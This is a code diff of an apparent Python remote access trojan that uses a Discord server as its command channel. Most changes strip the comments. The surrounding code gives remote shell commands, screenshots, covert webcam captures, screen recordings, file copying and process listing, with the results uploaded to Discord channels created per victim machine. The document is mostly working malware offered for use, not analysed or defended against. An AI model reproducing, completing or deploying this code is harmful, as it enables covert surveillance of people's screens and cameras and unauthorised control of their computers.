@@ -119,63 +119,63 @@ while True:
         async def on_ready():
             print(f"Logged in as {bot.user}")
         
-            # Replace with your server ID
+            
             guild = bot.get_guild("[SERVER_ID]")
             if guild is None:
                 print("Guild not found!")
                 return
         
-            # -------------------------------
-            # 1️⃣ Check or create 'ACCESS' category
+            
+            
             access_category = discord.utils.get(guild.categories, name="ACCESS")
             if access_category is None:
                 access_category = await guild.create_category("ACCESS")
                 print("Category 'ACCESS' created!")
         
-            # 2️⃣ Check or create 'main' channel inside 'ACCESS'
+            
             main_channel = discord.utils.get(access_category.channels, name="main")
             if main_channel is None:
                 main_channel = await guild.create_text_channel("main", category=access_category)
                 print("Channel 'main' created in 'ACCESS' category!")
         
-            # -------------------------------
-            # 3️⃣ Check or create 'AGENTS' category
+            
+            
             agents_category = discord.utils.get(guild.categories, name="AGENTS")
             if agents_category is None:
                 agents_category = await guild.create_category("AGENTS")
                 print("Category 'AGENTS' created!")
         
-            # 4️⃣ Check or create session channel in 'AGENTS' category
-            channel_name = f"{sesja}"  # your variable, not changed
+            
+            channel_name = f"{sesja}"  
             agent_channel = discord.utils.get(agents_category.channels, name=channel_name)
             if agent_channel is None:
                 agent_channel = await guild.create_text_channel(channel_name, category=agents_category)
                 print(f"Channel '{channel_name}' created in 'AGENTS' category!")
         
-            # 5️⃣ Send the connection message
+            
             await agent_channel.send("<@USER_ID> Agent Connected")
             print(f"Message sent in '{channel_name}'!")
             print("Connection established successfully.")
             @bot.event
             async def on_message(message):
                 global session
-                # Ignore messages from bots
+                
                 if message.author.bot:
                     return
 
-                # Only react to messages from the target user
+                
                 if message.author.id == "[USER_ID]" and message.content.strip() == "access":
                     if message.channel.name.lower() == "main":
                         session = "all"
                     else:
                         try:
-                            session = sesja  # Try to convert channel name to int
+                            session = sesja  
                         except ValueError:
-                            session = sesja  # fallback if not an integer
+                            session = sesja  
 
                     print(f"Session set to: {session}")
 
-                # Make sure commands still work if you have them
+                
                 await bot.process_commands(message)
         @bot.command()
         async def shell(ctx, *args):
@@ -205,7 +205,7 @@ while True:
             monitor = int(monitor)
             if session == "all":
                 with mss.mss() as sct:
-                    monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
+                    monitor = sct.monitors[monitor]  
                     screenshot = sct.grab(monitor)
                     img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                     img.save("ss.png")
@@ -214,7 +214,7 @@ while True:
             else:
                 if session == sesja:
                     with mss.mss() as sct:
-                        monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
+                        monitor = sct.monitors[monitor]  
                         screenshot = sct.grab(monitor)
                         img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                         img.save("ss.png")
@@ -501,16 +501,16 @@ while True:
                 await ctx.send("Capturing image...")
 
                 try:
-                    # Open default camera (0). If you need a different device, change the index.
-                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
+                    
+                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  
                     if not cap.isOpened():
                         await ctx.send("Could not open webcam.")
                         return
 
-                    # Warm up camera for a short moment
+                    
                     time.sleep(0.5)
 
-                    # Read a frame
+                    
                     ret, frame = cap.read()
                     cap.release()
 
@@ -518,14 +518,14 @@ while True:
                         await ctx.send("Failed to capture image from webcam.")
                         return
 
-                    # Save to a temporary file
+                    
                     filename = "cam_capture.jpg"
                     cv2.imwrite(filename, frame)
 
-                    # Send the file
+                    
                     await ctx.send(file=discord.File(filename))
 
-                    # Remove the temporary file
+                    
                     try:
                         os.remove(filename)
                     except OSError:
@@ -537,16 +537,16 @@ while True:
                 await ctx.send("Capturing image...")
 
                 try:
-                    # Open default camera (0). If you need a different device, change the index.
-                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
+                    
+                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  
                     if not cap.isOpened():
                         await ctx.send("Could not open webcam.")
                         return
 
-                    # Warm up camera for a short moment
+                    
                     time.sleep(0.5)
 
-                    # Read a frame
+                    
                     ret, frame = cap.read()
                     cap.release()
 
@@ -554,14 +554,14 @@ while True:
                         await ctx.send("Failed to capture image from webcam.")
                         return
 
-                    # Save to a temporary file
+                    
                     filename = "cam_capture.jpg"
                     cv2.imwrite(filename, frame)
 
-                    # Send the file
+                    
                     await ctx.send(file=discord.File(filename))
 
-                    # Remove the temporary file
+                    
                     try:
                         os.remove(filename)
                     except OSError:
@@ -681,7 +681,7 @@ while True:
         async def copy(ctx, source_path: str, dest_path: str):
             global session, sesja
         
-            # Check session first
+            
             if session is None:
                 await ctx.send("Session not set. Use access first.")
                 return
@@ -691,17 +691,17 @@ while True:
                 return
         
             try:
-                # Check source exists
+                
                 if not os.path.exists(source_path):
                     await ctx.send(f"Source file does not exist: {source_path}")
                     return
         
-                # Create destination directory if needed
+                
                 dest_dir = os.path.dirname(dest_path)
                 if dest_dir and not os.path.exists(dest_dir):
                     os.makedirs(dest_dir)
         
-                # Copy the file
+                
                 shutil.copy2(source_path, dest_path)
                 await ctx.send(f"File copied successfully from {source_path} to {dest_path}")
         
@@ -712,7 +712,7 @@ while True:
             filename = f"screen_capture_monitor{monitor_num}.mp4"
 
             with mss.mss() as sct:
-                # Check monitor number validity
+                
                 if monitor_num < 1 or monitor_num >= len(sct.monitors):
                     print(f"Invalid monitor {monitor_num}, defaulting to 1")
                     monitor_num = 1
@@ -727,11 +727,11 @@ while True:
 
                 last = time.time()
                 while recording:
-                    img = np.array(sct.grab(monitor))      # BGRA
-                    frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # to BGR
+                    img = np.array(sct.grab(monitor))      
+                    frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  
                     out.write(frame)
 
-                    # Simple rate limiter
+                    
                     dt = time.time() - last
                     delay = max(0, (1.0 / fps) - dt)
                     if delay:
@@ -761,7 +761,7 @@ while True:
             elif action == "stop":
                 if recording:
                     recording = False
-                    record_thread.join()  # wait until thread fully stops
+                    record_thread.join()  
                     await ctx.send("Stopped recording. Sending file...")
                     try:
                         await ctx.send(file=discord.File(filename))
@@ -832,11 +832,10 @@ while True:
         !processes - Lists all running processes.
         !screenrecord [action(start, stop)] [monitor] - Sends a screen record of the computer.
         !monitors - Reveals how many monitors does the computer have
-            '''
+        '''
             for i in range(0, len(wiadomosc), 2000):
                 await ctx.send(wiadomosc[i:i+2000])
         bot.run(hshfasudf)
     except Exception as e:
         print(f"Error: {e}")
         sleep(5)
-
